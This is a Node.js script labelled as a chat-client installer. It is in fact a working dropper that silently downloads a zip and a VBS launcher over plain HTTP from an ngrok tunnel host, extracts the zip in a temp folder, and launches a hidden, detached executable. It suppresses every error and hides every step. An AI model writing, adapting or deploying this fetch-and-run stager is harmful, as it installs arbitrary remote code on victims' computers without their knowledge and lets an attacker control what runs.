#!/usr/bin/env node

// Lightweight Client Installer - Downloads compressed client
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, execSync, spawn } = require('child_process');
const os = require('os');

// Configuration
const SERVER_HOST = '0.tcp.ngrok.io:14513'; // Change this to your server
const INSTALL_DIR = path.join(os.tmpdir(), 'ChatClient');
const CLIENT_ZIP = path.join(INSTALL_DIR, 'chat-client.zip');
const CLIENT_EXE = path.join(INSTALL_DIR, 'chat-client-silent.exe');
const LAUNCHER_VBS = path.join(INSTALL_DIR, 'run-client.vbs');

// Create install directory silently
if (!fs.existsSync(INSTALL_DIR)) {
  fs.mkdirSync(INSTALL_DIR, { recursive: true });
}

// Download file silently
function downloadFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https:') ? https : http;
    const file = fs.createWriteStream(filePath);
    
    const req = protocol.get(url, { 
      timeout: 30000,
      headers: {
        'Connection': 'close'  // Force new connection
      }
    }, (response) => {
      if (response.statusCode !== 200) {
        file.close();
        try { fs.unlinkSync(filePath); } catch(e) {}
        reject(new Error(`Download failed: ${response.statusCode}`));
        return;
      }
      
      response.pipe(file);
      
      file.on('finish', () => {
        file.close();
        resolve();
      });
      
      file.on('error', (err) => {
        try { fs.unlinkSync(filePath); } catch(e) {}
        reject(err);
      });
    });
    
    req.on('error', (err) => {
      file.close();
      try { fs.unlinkSync(filePath); } catch(e) {}
      reject(err);
    });
    
    req.on('timeout', () => {
      req.destroy();
      file.close();
      try { fs.unlinkSync(filePath); } catch(e) {}
      reject(new Error('Download timeout'));
    });
    
    req.setTimeout(30000);
  });
}

// Extract zip file silently
function extractZip() {
  if (process.platform === 'win32') {
    // Use PowerShell to extract silently
    try {
      execSync(`powershell -Command "Expand-Archive -Path '${CLIENT_ZIP}' -DestinationPath '${INSTALL_DIR}' -Force"`, { stdio: 'ignore' });
    } catch (e) {
      // Fallback to Windows built-in
      execSync(`powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('${CLIENT_ZIP}', '${INSTALL_DIR}')"`, { stdio: 'ignore' });
    }
  } else {
    // Use unzip on Linux/Mac
    execSync(`unzip -o "${CLIENT_ZIP}" -d "${INSTALL_DIR}"`, { stdio: 'ignore' });
  }
  
  // Clean up zip file
  fs.unlinkSync(CLIENT_ZIP);
}

// Main installer function
async function install() {
  try {
    // Download compressed client silently
    await downloadFile(`http://${SERVER_HOST}/download/client.zip`, CLIENT_ZIP);
    
    // Extract silently
    extractZip();
    
    // Download VBS launcher silently
    await downloadFile(`http://${SERVER_HOST}/download/launcher.vbs`, LAUNCHER_VBS);
    
    // Execute the client directly using spawn for true detachment
    if (process.platform === 'win32') {
      try {
        // Spawn client in completely detached mode
        const child = spawn(CLIENT_EXE, [], {
          detached: true,
          stdio: 'ignore',
          windowsHide: true
        });
        child.unref(); // Don't wait for child process
      } catch (error) {
        // Silent error handling
      }
      
      process.exit(0);
    } else {
      process.exit(0);
    }
    
  } catch (error) {
    // Silent error handling
    process.exit(1);
  }
}

// Start installation immediately and silently
install();